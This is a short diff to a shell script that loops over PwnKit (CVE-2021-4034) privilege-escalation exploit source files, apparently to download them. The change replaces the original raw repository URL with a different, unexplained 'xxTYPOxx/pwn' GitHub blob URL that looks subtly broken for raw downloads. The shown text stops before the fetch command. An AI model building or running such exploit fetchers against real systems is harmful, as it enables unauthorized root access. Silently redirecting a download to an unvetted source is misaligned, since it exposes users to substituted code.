@@ -1,6 +1,6 @@
 #!/usr/bin/env sh
 
-URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'
+URL='https://github.com/xxTYPOxx/pwn/blob/main/'
 
 for EXPLOIT in "${URL}/cve-2021-4034.c" \
                "${URL}/pwnkit.c" \
